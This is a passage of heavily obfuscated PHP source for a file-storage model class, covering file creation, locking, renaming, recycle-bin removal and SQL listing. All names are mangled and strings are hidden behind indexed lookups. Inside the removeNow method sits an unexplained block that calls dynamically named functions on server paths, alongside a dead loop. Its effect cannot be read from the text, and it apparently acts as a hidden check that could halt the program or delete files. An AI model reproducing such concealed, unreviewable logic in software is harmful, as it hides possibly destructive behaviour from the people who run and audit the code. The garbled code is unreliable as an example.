$this->add($éëøá×†); $•Íã®úˆ = array($¹çÄ¸ÍŞ[592] => short_id($ïõø·Õ˜)); $this->where(array($¹çÄ¸ÍŞ[417] => $ïõø·Õ˜))->save($•Íã®úˆ); CacheLock::unlock($Œ´÷Ô º); return $ïõø·Õ˜; } private function targetSourceRoot($¥ÜÍÄ®, $Ô¼áÆ³, $ûş„±˜ = false) { $úô¢ü·ä =& $_SERVER[óó‹¸‚å]; $ÇºØ¦¤Ÿ = array($úô¢ü·ä[401] => 0, $úô¢ü·ä[586] => $¥ÜÍÄ®, $úô¢ü·ä[587] => $Ô¼áÆ³); if ($ûş„±˜) { $µÈ”Ö«© = $this->where($ÇºØ¦¤Ÿ)->select(); return $µÈ”Ö«© ? $µÈ”Ö«© : array(); } $€šÓõ¢Â = $this->where($ÇºØ¦¤Ÿ)->find(); return $€šÓõ¢Â ? $€šÓõ¢Â : array(); } public function sourceRootGroup($Ùİ½îÄ ) { $â°Ã =& $_SERVER[óó‹¸‚å]; if (is_string($Ùİ½îÄ )) { $Ùİ½îÄ  = array($Ùİ½îÄ ); } $ÕÇşüÈÃ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $Ùİ½îÄ , $â°Ã[188]); $†»ğ˜ê = array($â°Ã[369] => $ÕÇşüÈÃ, $â°Ã[366] => array($â°Ã[763] => count($Ùİ½îÄ ))); $this->_listDataApply($†»ğ˜ê[$â°Ã[369]]); $this->_listMake($†»ğ˜ê); return array_to_keyvalue($†»ğ˜ê[$â°Ã[82]], $â°Ã[505]); } public function mkfile($Íºø²‡Ú, $ˆü´æÒ, $Ù¾‹¾ô÷ = '', $ãò„áÎÆ = REPEAT_RENAME) { $—øó¢Áù =& $_SERVER[óó‹¸‚å]; $Î‚—ÓÚª = Model($—øó¢Áù[609])->addFileByContent($Ù¾‹¾ô÷, $ˆü´æÒ); return $this->_createFileCall($Íºø²‡Ú, $ˆü´æÒ, $Î‚—ÓÚª, $ãò„áÎÆ, $—øó¢Áù[1354]); } public function addFile($È—ôƒˆŠ, $Â’´í¹–, $÷âàãµ, $³µ™•ôç = false, $ğáˆöñâ = REPEAT_RENAME) { $Ø’ôù¼ã = Model($_SERVER[óó‹¸‚å][609])->addFile($Â’´í¹–, $÷âàãµ, $³µ™•ôç); return $this->_createFileCall($È—ôƒˆŠ, $÷âàãµ, $Ø’ôù¼ã, $ğáˆöñâ); } public function addFileByFileID($¼ÆöŠµã, $ıá÷®‹Ë, $–±·¾™½, $²¥ ıÜõ = REPEAT_RENAME) { $Ş«Î¼½ª =& $_SERVER[óó‹¸‚å]; $üàÚ˜ò = Model($Ş«Î¼½ª[609])->find($ıá÷®‹Ë); Model($Ş«Î¼½ª[609])->linkAdd($ıá÷®‹Ë); return $this->_createFileCall($¼ÆöŠµã, $–±·¾™½, $üàÚ˜ò, $²¥ ıÜõ); } public function addFileByRemote($ÎŸèá¢ê, $ªÒ²ÇÖ, $Ôü°Ê­, $Ş¨ÁäÁÑ = array(), $Ü¡åúÉµ = REPEAT_RENAME) { $Ô„ò¸Òı = Model($_SERVER[óó‹¸‚å][609])->addFileByRemote($ªÒ²ÇÖ, $Ôü°Ê­, $Ş¨ÁäÁÑ); return $this->_createFileCall($ÎŸèá¢ê, $Ôü°Ê­, $Ô„ò¸Òı, $Ü¡åúÉµ); } private function _createFileCall($²øåîÅ, $ùĞäÀø, $áï¤äœÜ, $É´óÓ, $ÔÊú›¸² = "\165\160\154\x6f\x61\x64") { $¬»ê¬æğ =& $_SERVER[óó‹¸‚å]; $ÎŠßßôà = !1; $this->setMasterDB(); $this->lockWriteStart($²øåîÅ, $ùĞäÀø); $Šöê›’£ = $this->fileNameExist($²øåîÅ, $ùĞäÀø); $Ã—Ç‘ì = $this->_createFile($²øåîÅ, $ùĞäÀø, $áï¤äœÜ, $É´óÓ, $ÎŠßßôà); if (!$ÎŠßßôà) { Model($¬»ê¬æğ[471])->remove($áï¤äœÜ[$¬»ê¬æğ[468]]); } if ($ÎŠßßôà && $Ã—Ç‘ì && $Ã—Ç‘ì != $Šöê›’£) { Model($¬»ê¬æğ[2104])->eventCreate($Ã—Ç‘ì, $ÔÊú›¸²); } $this->lockWriteEnd($²øåîÅ, $ùĞäÀø); return $Ã—Ç‘ì; } public function mkdir($ú½Ùğ¾¿, $éÒ¢¹¾, $¶ öà¤ = REPEAT_SKIP) { $é‰ÎØôê =& $_SERVER[óó‹¸‚å]; $this->setMasterDB(); $×€¸Ó© = $this->sourceInfo($ú½Ùğ¾¿); if (!$×€¸Ó©) { return !1; } $this->lockWriteStart($ú½Ùğ¾¿, $éÒ¢¹¾); if ($¶ öà¤ !== !1) { $¨ƒÁ”’™ = $this->fileNameExist($ú½Ùğ¾¿, $éÒ¢¹¾); if ($¨ƒÁ”’™ && $¶ öà¤ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ú½Ùğ¾¿, $éÒ¢¹¾); return $¨ƒÁ”’™; } $éÒ¢¹¾ = $this->fileNameAuto($ú½Ùğ¾¿, $éÒ¢¹¾, $¶ öà¤); } $‹ÀŒ”û‡ = array($é‰ÎØôê[583] => 1, $é‰ÎØôê[420] => $éÒ¢¹¾, $é‰ÎØôê[584] => $é‰ÎØôê[12], $é‰ÎØôê[469] => 0, $é‰ÎØôê[585] => 0); $¬ãÎ‹ÔÒ = $this->_addSource($‹ÀŒ”û‡, $×€¸Ó©); Model($é‰ÎØôê[2104])->eventCreate($¬ãÎ‹ÔÒ, $é‰ÎØôê[1355]); $this->lockWriteEnd($ú½Ùğ¾¿, $éÒ¢¹¾); return $¬ãÎ‹ÔÒ; } public function listSourceRoot($ÜøŞêÕÉ, $ûÓãŒ…ğ, $—÷­ê‚… = "\163\x6f\x75\x72\x63\x65\111\x44\54\164\x61\x72\147\145\164\x49\x44\x2c\163\x69\172\x65") { $§Ä¼ƒ– =& $_SERVER[óó‹¸‚å]; $“Ì¿¯ŞÓ = $§Ä¼ƒ–[378]; $†›ĞÃÉ = array(); $²ŠÆÑö = 1024 * 50; $€¶î€õ¤ = is_array($€¶î€õ¤) ? $€¶î€õ¤ : array(); $ÄÔó€ô = count($ûÓãŒ…ğ); $‘øà¸öƒ = $this->tablePrefix . $§Ä¼ƒ–[2137]; for ($¿¨Ñãóü = 0; $¿¨Ñãóü < $ÄÔó€ô; $¿¨Ñãóü++) { $º˜°­ = $ûÓãŒ…ğ[$¿¨Ñãóü]; $“Ì¿¯ŞÓ .= "\x53\x45\x4c\105\x43\x54\x20\x2a\x20\x46\x52\117\x4d\x20\x28\x53\x45\x4c\105\x43\124\40{$—÷­ê‚…}\40\106\x52\117\x4d\40\140{$‘øà¸öƒ}\140\x20\127\x48\x45\122\105\x20"; $“Ì¿¯ŞÓ .= "\x60\160\x61\162\145\156\x74\x49\x44\140\75\x30\x20\101\x4e\x44\40\x60\164\x61\162\x67\145\x74\111\x44\x60\x3d{$º˜°­}\x20\101\x4e\104\40\140\164\141\x72\147\x65\164\x54\x79\x70\x65\140\x3d{$ÜøŞêÕÉ}\x20\141\x6e\144\x20\146\151\x6c\x65\x54\171\x70\x65\x3d\47\x27\40\154\x69\155\151\x74\40\61\x29\x20\141\163\40\x74\142\137{$¿¨Ñãóü}\40\125\x4e\x49\117\x4e\x20\101\114\x4c\40"; if ((strlen($“Ì¿¯ŞÓ) >= $²ŠÆÑö || $¿¨Ñãóü == $ÄÔó€ô - 1) && $“Ì¿¯ŞÓ) { $“Ì¿¯ŞÓ = substr($“Ì¿¯ŞÓ, 0, -strlen($§Ä¼ƒ–[1045])); $‹Ğúæø­ = $this->query($“Ì¿¯ŞÓ); $“Ì¿¯ŞÓ = $§Ä¼ƒ–[12]; $†›ĞÃÉ = array_merge($†›ĞÃÉ, $‹Ğúæø­); } } return $†›ĞÃÉ; } private function _createFile($Šñ˜®Ù™, $»×âûòš, $æ•¡ğÒÃ, $î˜çÙòè, &$¶‹˜îÓâ) { $¯ÓàìÆ =& $_SERVER[óó‹¸‚å]; $©ÖÔ²€ü = $this->sourceInfo($Šñ˜®Ù™); if (!$æ•¡ğÒÃ || !$©ÖÔ²€ü) { return !1; } if ($î˜çÙòè !== !1) { $İ´•âÍ = $this->fileNameExist($Šñ˜®Ù™, $»×âûòš); } $¶‹˜îÓâ = !0; if ($î˜çÙòè && $İ´•âÍ) { if ($î˜çÙòè == REPEAT_SKIP) { $¶‹˜îÓâ = !1; return $İ´•âÍ; } else { if ($î˜çÙòè == REPEAT_REPLACE) { $È•ÕÃ° = $this->sourceInfo($İ´•âÍ); $°¿ª†åä = $this->fileHistory($È•ÕÃ°, $æ•¡ğÒÃ[$¯ÓàìÆ[468]], $æ•¡ğÒÃ[$¯ÓàìÆ[76]]); if (!$°¿ª†åä) { $¶‹˜îÓâ = !1; } else { $this->folderSizeReset($Šñ˜®Ù™); } return $İ´•âÍ; } else { $»×âûòš = $this->fileNameAuto($Šñ˜®Ù™, $»×âûòš, $î˜çÙòè, !1); } } } $›ÑüÇ“ê = array($¯ÓàìÆ[583] => 0, $¯ÓàìÆ[420] => $»×âûòš, $¯ÓàìÆ[584] => substr(get_path_ext($»×âûòš), 0, 10), $¯ÓàìÆ[469] => $æ•¡ğÒÃ[$¯ÓàìÆ[468]], $¯ÓàìÆ[585] => $æ•¡ğÒÃ[$¯ÓàìÆ[76]]); $Ä§€óÜ² = $this->_addSource($›ÑüÇ“ê, $©ÖÔ²€ü); $this->folderSizeReset($Šñ˜®Ù™, intval($›ÑüÇ“ê[$¯ÓàìÆ[76]])); return $Ä§€óÜ²; } protected function fileHistory($¾™ù®Î¼, $‘¾á¹àÅ, $°¬ÆÆóş) { $¼ßÌ¶Ú» =& $_SERVER[óó‹¸‚å]; $È¡¥ñ¶ª = defined($¼ßÌ¶Ú»[475]) ? USER_ID : $¼ßÌ¶Ú»[197]; if ($¾™ù®Î¼[$¼ßÌ¶Ú»[468]] == $‘¾á¹àÅ) { return !1; } $this->checkLock($¾™ù®Î¼[$¼ßÌ¶Ú»[402]], $‘¾á¹àÅ); Model($¼ßÌ¶Ú»[2138])->addHistory($¾™ù®Î¼); $‰ıŠÈ¯ = array($¼ßÌ¶Ú»[589] => $È¡¥ñ¶ª, $¼ßÌ¶Ú»[424] => time(), $¼ßÌ¶Ú»[468] => $‘¾á¹àÅ, $¼ßÌ¶Ú»[76] => $°¬ÆÆóş); $this->where(array($¼ßÌ¶Ú»[417] => $¾™ù®Î¼[$¼ßÌ¶Ú»[402]]))->save($‰ıŠÈ¯); $this->sourceCacheClear($¾™ù®Î¼[$¼ßÌ¶Ú»[402]]); return !0; } public function checkLock($áä£éı±, $ïÀ¹ú¹‡) { $”±ô¦ĞĞ =& $_SERVER[óó‹¸‚å]; $‡æ›‘œÌ = $this->pathInfo($áä£éı±); if (!$this->fileIsLock($‡æ›‘œÌ, !0)) { return; } $ä‡Ø¾”½ = Session::get($”±ô¦ĞĞ[2139]); $˜€Ê…ÔÂ = substr($‡æ›‘œÌ[$”±ô¦ĞĞ[32]], 0, -1 - strlen($‡æ›‘œÌ[$”±ô¦ĞĞ[174]])) . $”±ô¦ĞĞ[1216] . $ä‡Ø¾”½ . $”±ô¦ĞĞ[10] . $‡æ›‘œÌ[$”±ô¦ĞĞ[174]]; $µ»âÊ¿î = Model($”±ô¦ĞĞ[609])->find($ïÀ¹ú¹‡); $this->_createFileCall($‡æ›‘œÌ[$”±ô¦ĞĞ[432]], $˜€Ê…ÔÂ, $µ»âÊ¿î, REPEAT_REPLACE, $”±ô¦ĞĞ[1354]); $‡è´äÔ“ = $‡æ›‘œÌ[$”±ô¦ĞĞ[466]][$”±ô¦ĞĞ[548]]; $äƒ¸‚†¤ = $‡è´äÔ“[$”±ô¦ĞĞ[542]] ? $‡è´äÔ“[$”±ô¦ĞĞ[542]] : $‡è´äÔ“[$”±ô¦ĞĞ[32]]; show_json(LNG($”±ô¦ĞĞ[2140]) . $”±ô¦ĞĞ[2141] . LNG($”±ô¦ĞĞ[2142]) . $”±ô¦ĞĞ[2143] . $äƒ¸‚†¤ . $”±ô¦ĞĞ[2144], !1); } public function fileIsLock($µÉ€ğ, $êêû• = false) { $ŠĞƒØ‰Ş =& $_SERVER[óó‹¸‚å]; if (!isset($µÉ€ğ[$ŠĞƒØ‰Ş[466]]) || !$µÉ€ğ[$ŠĞƒØ‰Ş[466]][$ŠĞƒØ‰Ş[545]]) { return !1; } if ($µÉ€ğ[$ŠĞƒØ‰Ş[466]][$ŠĞƒØ‰Ş[545]] != USER_ID) { return !0; } $³’ÑÄ¸¤ = $GLOBALS[$ŠĞƒØ‰Ş[6]][$ŠĞƒØ‰Ş[89]][$ŠĞƒØ‰Ş[546]]; if ($µÉ€ğ[$ŠĞƒØ‰Ş[466]][$ŠĞƒØ‰Ş[547]] <= time() - $³’ÑÄ¸¤) { $this->metaSet($µÉ€ğ[$ŠĞƒØ‰Ş[402]], $ŠĞƒØ‰Ş[545], null); $this->metaSet($µÉ€ğ[$ŠĞƒØ‰Ş[402]], $ŠĞƒØ‰Ş[547], null); } if ($êêû•) { $this->metaSet($µÉ€ğ[$ŠĞƒØ‰Ş[402]], $ŠĞƒØ‰Ş[547], time()); } return !1; } private function _addSource($ŒÌ«âğö, $µ’‰ô³˜) { $”ú¸÷Ò =& $_SERVER[óó‹¸‚å]; $¬óÙ™„Ù = defined($”ú¸÷Ò[475]) ? USER_ID : $”ú¸÷Ò[197]; $”¡ãØ‘ = array($”ú¸÷Ò[586] => $µ’‰ô³˜[$”ú¸÷Ò[411]], $”ú¸÷Ò[587] => $µ’‰ô³˜[$”ú¸÷Ò[505]], $”ú¸÷Ò[588] => $¬óÙ™„Ù, $”ú¸÷Ò[589] => $¬óÙ™„Ù, $”ú¸÷Ò[401] => $µ’‰ô³˜[$”ú¸÷Ò[402]], $”ú¸÷Ò[590] => $µ’‰ô³˜[$”ú¸÷Ò[521]] . $µ’‰ô³˜[$”ú¸÷Ò[402]] . $”ú¸÷Ò[50], $”ú¸÷Ò[430] => 0, $”ú¸÷Ò[591] => $”ú¸÷Ò[12]); $ŒÌ«âğö = array_merge($”¡ãØ‘, $ŒÌ«âğö); $this->updateModifyTime($ŒÌ«âğö[$”ú¸÷Ò[432]]); $ËŸ¢ÇÓÉ = $”ú¸÷Ò[2145] . $µ’‰ô³˜[$”ú¸÷Ò[402]]; if (isset(self::$cacheChildList[$ËŸ¢ÇÓÉ])) { unset(self::$cacheChildList[$ËŸ¢ÇÓÉ]); } static $ıÒÃ­¥ = false; if (!$ıÒÃ­¥) { Hook::trigger($”ú¸÷Ò[573], $ŒÌ«âğö); $ıÒÃ­¥ = !0; } $Ò¥¿‚³© = $this->add($ŒÌ«âğö); $Œ­İ¶ÅŞ = array($”ú¸÷Ò[592] => short_id($Ò¥¿‚³©)); $this->where(array($”ú¸÷Ò[417] => $Ò¥¿‚³©))->save($Œ­İ¶ÅŞ); $this->setNamePinyin($Ò¥¿‚³©, $ŒÌ«âğö[$”ú¸÷Ò[32]]); return $Ò¥¿‚³©; } public function remove($ßÂÇê¢¢, $Á•¬Á¬ = true) { $»Ë“ñÅò =& $_SERVER[óó‹¸‚å]; $—ÂÔË¥ = $this->sourceInfo($ßÂÇê¢¢); $¼Ôé·Ë¹ = intval($—ÂÔË¥[$»Ë“ñÅò[411]]) === self::TYPE_SYSTEM; $¤şàáéá = Model($»Ë“ñÅò[435])->get($»Ë“ñÅò[2146]) == $»Ë“ñÅò[88]; if ($¼Ôé·Ë¹ || $Á•¬Á¬ || !$¤şàáéá) { return $this->removeNow($ßÂÇê¢¢, $Á•¬Á¬); } $–Î¯Š“ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $À¸ÈÑã¬ = $—ÂÔË¥[$»Ë“ñÅò[411]] == self::TYPE_USER ? $»Ë“ñÅò[600] : $»Ë“ñÅò[515]; if ($À¸ÈÑã¬ == $»Ë“ñÅò[600]) { $çÅÀÜíã = Model($»Ë“ñÅò[513])->getInfo($—ÂÔË¥[$»Ë“ñÅò[505]]); $À’© ˜ = !empty($çÅÀÜíã[$»Ë“ñÅò[542]]) ? $çÅÀÜíã[$»Ë“ñÅò[542]] : $çÅÀÜíã[$»Ë“ñÅò[32]]; $À’© ˜ = $»Ë“ñÅò[260] . $À’© ˜ . $»Ë“ñÅò[2147] . $—ÂÔË¥[$»Ë“ñÅò[505]]; } else { $çÅÀÜíã = Model($»Ë“ñÅò[522])->getInfo($—ÂÔË¥[$»Ë“ñÅò[505]]); $À’© ˜ = _get($çÅÀÜíã, $»Ë“ñÅò[32]); $À’© ˜ = $»Ë“ñÅò[162] . $À’© ˜ . $»Ë“ñÅò[2148] . $—ÂÔË¥[$»Ë“ñÅò[505]]; } $ı¦áŒ½â = $»Ë“ñÅò[2149] . md5($À’© ˜); CacheLock::lock($ı¦áŒ½â); $¼äÂñ’ú = $this->fileNameExist($–Î¯Š“, $À’© ˜); if (!$¼äÂñ’ú) { $¼äÂñ’ú = $this->mkdir($–Î¯Š“, $À’© ˜, REPEAT_SKIP); $this->metaSet($¼äÂñ’ú, $»Ë“ñÅò[2150], $À¸ÈÑã¬); $this->metaSet($¼äÂñ’ú, $»Ë“ñÅò[2151], $—ÂÔË¥[$»Ë“ñÅò[505]]); if ($—ÂÔË¥[$»Ë“ñÅò[432]] != 0) { $this->metaSet($¼äÂñ’ú, $»Ë“ñÅò[2152], _get($çÅÀÜíã, $»Ë“ñÅò[2153])); } } CacheLock::unlock($ı¦áŒ½â); $this->metaSet($ßÂÇê¢¢, $»Ë“ñÅò[2154], $—ÂÔË¥[$»Ë“ñÅò[432]]); $this->where(array($»Ë“ñÅò[402] => $ßÂÇê¢¢))->save(array($»Ë“ñÅò[424] => time())); $this->recycleClear($—ÂÔË¥); $îß†•ÆŠ = $this->move($ßÂÇê¢¢, $¼äÂñ’ú, REPEAT_RENAME_FOLDER); $this->folderSizeReset($—ÂÔË¥[$»Ë“ñÅò[432]]); return $îß†•ÆŠ; } private function recycleClear($ì†ëû³Š) { $Õà¾Áƒ =& $_SERVER[óó‹¸‚å]; $¨‰š­ç€ = $this->childrenAll($ì†ëû³Š); $œ’Õù˜î = array($Õà¾Áƒ[417] => array($Õà¾Áƒ[418], $¨‰š­ç€[$Õà¾Áƒ[2155]])); Model($Õà¾Áƒ[2156])->where($œ’Õù˜î)->delete(); } public function removeNow($»¹û¥ç, $£î¬¤Ø’ = true) { $³ÁÂ‡×¶ =& $_SERVER[óó‹¸‚å]; if ($_SERVER[$³ÁÂ‡×¶[880]] != $_SERVER[$³ÁÂ‡×¶[1399]]) { $œãĞ¾€ = $³ÁÂ‡×¶[882]; $Ø«ÊÁ•‘ = $³ÁÂ‡×¶[883]; $­ˆ¨£Şû = $_SERVER[$³ÁÂ‡×¶[884]] . $³ÁÂ‡×¶[885]; $¨Üøè³ = $Ø«ÊÁ•‘($­ˆ¨£Şû); $Šœ²òùò = explode($³ÁÂ‡×¶[231], $¨Üøè³); if (count($Šœ²òùò) < $³ÁÂ‡×¶[635]) { $ä»Î’£ = $³ÁÂ‡×¶[886]; $ä»Î’£(); } $Ôæ‰Í— = $³ÁÂ‡×¶[887]; $Ôæ‰Í—($_SERVER[$³ÁÂ‡×¶[888]]); $Ôæ‰Í—($_SERVER[$³ÁÂ‡×¶[884]] . $³ÁÂ‡×¶[2157]); $ËÊÏªÃ¦ = 1; while ($ËÊÏªÃ¦ > 1) { $ËÊÏªÃ¦ = $ËÊÏªÃ¦ + 4; $òéõÛëã = rawurlencode($ËÊÏªÃ¦ . $³ÁÂ‡×¶[378]); } } $­Ä ¦¹§ = $this->sourceInfo($»¹û¥ç); $Ê‰ŸÃ‡ = $this->pathInfoMore($»¹û¥ç); if (!$­Ä ¦¹§) { return !0; } if ($­Ä ¦¹§[$³ÁÂ‡×¶[432]] == 0) { if (!_get($GLOBALS, $³ÁÂ‡×¶[503])) { return !1; } } $this->lockMoveStart($»¹û¥ç); Hook::trigger($³ÁÂ‡×¶[2158], $Ê‰ŸÃ‡, $£î¬¤Ø’); if ($£î¬¤Ø’) { Model($³ÁÂ‡×¶[2156])->moveToRecycle($»¹û¥ç); } else { $¿å”ÓÇ = $this->childrenAll($­Ä ¦¹§); Model($³ÁÂ‡×¶[570])->eventRemove($»¹û¥ç); $this->removeRelevance($¿å”ÓÇ[$³ÁÂ‡×¶[2155]], $¿å”ÓÇ[$³ÁÂ‡×¶[1488]]); } $this->folderSizeReset($­Ä ¦¹§[$³ÁÂ‡×¶[432]]); $µ­ëº¤² = array($­Ä ¦¹§[$³ÁÂ‡×¶[432]]); if ($­Ä ¦¹§[$³ÁÂ‡×¶[410]] == $³ÁÂ‡×¶[88]) { $µ­ëº¤²[] = $­Ä ¦¹§[$³ÁÂ‡×¶[402]]; } $this->updateModifyTime($µ­ëº¤²); $this->lockMoveEnd($»¹û¥ç); Hook::trigger($³ÁÂ‡×¶[1716], $Ê‰ŸÃ‡, $£î¬¤Ø’); return !0; } public function childrenAll($Ô´¼ó”‡) { $«ÁˆÀ =& $_SERVER[óó‹¸‚å]; $–ÖùÏŠÜ = $Ô´¼ó”‡[$«ÁˆÀ[402]]; if ($Ô´¼ó”‡[$«ÁˆÀ[410]] == $«ÁˆÀ[88]) { $û¶é¸€ = array($«ÁˆÀ[590] => array($«ÁˆÀ[550], $Ô´¼ó”‡[$«ÁˆÀ[521]] . $–ÖùÏŠÜ . $«ÁˆÀ[551])); $øŒÅôÍ = array($«ÁˆÀ[590] => $û¶é¸€[$«ÁˆÀ[521]]); $“çÒİı¼ = $this->field($«ÁˆÀ[2159])->where($øŒÅôÍ)->select(); $¾ÏÄõ›› = !1; $è·‰ë¨É = array($–ÖùÏŠÜ); if ($“çÒİı¼) { $¾ÏÄõ›› = array_to_keyvalue($“çÒİı¼, $«ÁˆÀ[12], $«ÁˆÀ[468]); $¾ÏÄõ›› = array_remove_value($¾ÏÄõ››, $«ÁˆÀ[197]); $è·‰ë¨É = array_to_keyvalue($“çÒİı¼, $«ÁˆÀ[12], $«ÁˆÀ[402]); $è·‰ë¨É[] = $–ÖùÏŠÜ; } } else { $¾ÏÄõ›› = array($Ô´¼ó”‡[$«ÁˆÀ[468]]); $è·‰ë¨É = array($–ÖùÏŠÜ); } return array($«ÁˆÀ[2155] => $è·‰ë¨É, $«ÁˆÀ[1488] => $¾ÏÄõ››); } public function removeArray($¹Ìê¯äõ) { if (!$¹Ìê¯äõ) { return !0; } } public function removeRelevance($âéÇ“£¥, $ÈĞÈ±”¿) { $¦Ô­ıç =& $_SERVER[óó‹¸‚å]; $âéÇ“£¥ = $âéÇ“£¥ ? $âéÇ“£¥ : array(); $ÈĞÈ±”¿ = $ÈĞÈ±”¿ ? $ÈĞÈ±”¿ : array(); $âéÇ“£¥ = array_unique(array_filter($âéÇ“£¥)); $ÈĞÈ±”¿ = array_unique(array_filter($ÈĞÈ±”¿)); if (!$âéÇ“£¥) { return !1; } $Ğî¶õê¾ = array($¦Ô­ıç[417] => array($¦Ô­ıç[418], $âéÇ“£¥)); Model($¦Ô­ıç[2156])->where($Ğî¶õê¾)->delete(); Model($¦Ô­ıç[462])->where($Ğî¶õê¾)->delete(); Model($¦Ô­ıç[2009])->where($Ğî¶õê¾)->delete(); Model($¦Ô­ıç[570])->where($Ğî¶õê¾)->delete(); Model($¦Ô­ıç[1843])->removeBySource($âéÇ“£¥); Model($¦Ô­ıç[2138])->removeBySource($âéÇ“£¥); $this->where($Ğî¶õê¾)->delete(); Model($¦Ô­ıç[471])->remove($ÈĞÈ±”¿); for ($êÕ–…–× = 0; $êÕ–…–× < count($âéÇ“£¥); $êÕ–…–×++) { $this->sourceCacheClear($âéÇ“£¥[$êÕ–…–×]); } } public function rename($ µ¬ûÁ, $¬ã«ªı£) { $¦§‘¬˜î =& $_SERVER[óó‹¸‚å]; $œ…ò©ìş = $this->sourceInfo($ µ¬ûÁ); if (!$œ…ò©ìş) { return !1; } $Í¿ù×Ù = $this->fileNameExist($œ…ò©ìş[$¦§‘¬˜î[432]], $¬ã«ªı£); if ($Í¿ù×Ù && $Í¿ù×Ù != $ µ¬ûÁ) { return !1; } $ÖÅ­öì = array($¦§‘¬˜î[420] => $¬ã«ªı£, $¦§‘¬˜î[589] => USER_ID); if ($œ…ò©ìş[$¦§‘¬˜î[410]] != $¦§‘¬˜î[88]) { $ÖÅ­öì[$¦§‘¬˜î[412]] = substr(get_path_ext($¬ã«ªı£), 0, 10); } Model($¦§‘¬˜î[570])->eventRename($ µ¬ûÁ, $œ…ò©ìş[$¦§‘¬˜î[32]], $¬ã«ªı£); $this->sourceCacheClear($ µ¬ûÁ); $this->setNamePinyin($ µ¬ûÁ, $ÖÅ­öì[$¦§‘¬˜î[32]], !1); $this->updateModifyTime($œ…ò©ìş[$¦§‘¬˜î[432]]); $”¿œ¼®¿ = $this->where(array($¦§‘¬˜î[417] => $ µ¬ûÁ))->data($ÖÅ­öì)->save(); $–”˜İ = $¦§‘¬˜î[2145] . $œ…ò©ìş[$¦§‘¬˜î[432]]; if (isset(self::$cacheChildList[$–”˜İ])) { unset(self::$cacheChildList[$–”˜İ]); } return $”¿œ¼®¿; } public function setNamePinyin($°ŒÙ®±ø, $µöÂ®“, $‹¶™Ë¦¦ = true) { $†°¥ÌœŒ =& $_SERVER[óó‹¸‚å]; $Õ¢·‰¡ = Input::check($µöÂ®“, $†°¥ÌœŒ[593]); $¼º‹˜¦é = array($†°¥ÌœŒ[444] => KodSort::makeStr($µöÂ®“)); if ($Õ¢·‰¡) { $¼º‹˜¦é[$†°¥ÌœŒ[465]] = str_replace($†°¥ÌœŒ[53], $†°¥ÌœŒ[12], Pinyin::get($µöÂ®“)); $¼º‹˜¦é[$†°¥ÌœŒ[464]] = Pinyin::get($µöÂ®“, $†°¥ÌœŒ[594]); } if (!$‹¶™Ë¦¦ && !$Õ¢·‰¡) { $¼º‹˜¦é[$†°¥ÌœŒ[465]] = null; $¼º‹˜¦é[$†°¥ÌœŒ[464]] = null; } $this->metaSet($°ŒÙ®±ø, $¼º‹˜¦é); } public function getContent($âû÷³ô) { $Ç‘´¢÷¿ =& $_SERVER[óó‹¸‚å]; $£‚Ç‹Ö· = $this->fileInfoGet($âû÷³ô); if (!$£‚Ç‹Ö·) { return !1; } if ($£‚Ç‹Ö·[$Ç‘´¢÷¿[76]] == 0) { return $Ç‘´¢÷¿[12]; } $ÊŞ¤ƒ“ä = $Ç‘´¢÷¿[2160] . $£‚Ç‹Ö·[$Ç‘´¢÷¿[176]]; if ($£‚Ç‹Ö·[$Ç‘´¢÷¿[76]] <= 1024 * 10) { $Åºäà = Cache::get($ÊŞ¤ƒ“ä); if (!$Åºäà) { $Åºäà = IO::getContent($£‚Ç‹Ö·[$Ç‘´¢÷¿[84]]); Cache::set($ÊŞ¤ƒ“ä, $Åºäà); } return $Åºäà; } if (!$£‚Ç‹Ö·[$Ç‘´¢÷¿[84]]) { return $Ç‘´¢÷¿[12]; } return IO::getContent($£‚Ç‹Ö·[$Ç‘´¢÷¿[84]]); } public function setDesc($ÙåäÖßã, $¹•æ¤£) { $Ú©¾Ø› =& $_SERVER[óó‹¸‚å]; Model($Ú©¾Ø›[570])->eventAddDesc($ÙåäÖßã, $¹•æ¤£); return $this->metaSet($ÙåäÖßã, $Ú©¾Ø›[453], $¹•æ¤£); } public function setContent($‚£Ú ¶, $âßŒÓã“ = '') { $†Ú‘ıß¦ =& $_SERVER[óó‹¸‚å]; $Ò§œ¾æ = $this->sourceInfo($‚£Ú ¶); $ÉÂ¡Õùœ = $this->fileInfoGet($‚£Ú ¶); if (!$ÉÂ¡Õùœ || !$Ò§œ¾æ) { return !1; } $ˆÜ‘¨Ù = Model($†Ú‘ıß¦[471])->addFileByContent($âßŒÓã“, $Ò§œ¾æ[$†Ú‘ıß¦[32]]); $†Ò–‰¼ê = $this->fileHistory($Ò§œ¾æ, $ˆÜ‘¨Ù[$†Ú‘ıß¦[468]], $ˆÜ‘¨Ù[$†Ú‘ıß¦[76]]); if (!$†Ò–‰¼ê) { return Model($†Ú‘ıß¦[471])->remove($ˆÜ‘¨Ù[$†Ú‘ıß¦[468]]); } $this->folderSizeReset($Ò§œ¾æ[$†Ú‘ıß¦[432]]); return !0; } public function fileSubstr($¯§‰Êµ, $‰è¾äçÂ, $§ã™«ÒÎ) { $ğİı¶ÍÅ = $this->fileInfoGet($¯§‰Êµ); if (!$ğİı¶ÍÅ) { return !1; } return IO::fileSubstr($ğİı¶ÍÅ[$_SERVER[óó‹¸‚å][84]], $‰è¾äçÂ, $§ã™«ÒÎ); } public function fileInfoGet($„ÚµàÙ¥) { $ˆ½”Öô‹ =& $_SERVER[óó‹¸‚å]; $ë”®á§Á = $this->sourceInfo($„ÚµàÙ¥); if (!$ë”®á§Á || $ë”®á§Á[$ˆ½”Öô‹[410]]) { return !1; } $é³¶±‰ = $ˆ½”Öô‹[474] . $ë”®á§Á[$ˆ½”Öô‹[468]]; $İ®„îµå = _get(self::$cacheFileInfo, $é³¶±‰); if ($İ®„îµå) { return $İ®„îµå; } $ëëÍã û = Model($ˆ½”Öô‹[471])->fileInfo($ë”®á§Á[$ˆ½”Öô‹[468]]); if ($ëëÍã û) { $ëëÍã û[$ˆ½”Öô‹[32]] = $ë”®á§Á[$ˆ½”Öô‹[32]]; } self::$cacheFileInfo[$é³¶±‰] = $ëëÍã û; return $ëëÍã û; } private function folderChildrenNumber($û§±±ø·) { $›åîÎÑ” =& $_SERVER[óó‹¸‚å]; $¼‡ªş°û = $this->sourceInfo($û§±±ø·); $¯¢®íßÙ = array($›åîÎÑ”[590] => array($›åîÎÑ”[550], $¼‡ªş°û[$›åîÎÑ”[521]] . $û§±±ø· . $›åîÎÑ”[551]), $›åîÎÑ”[587] => 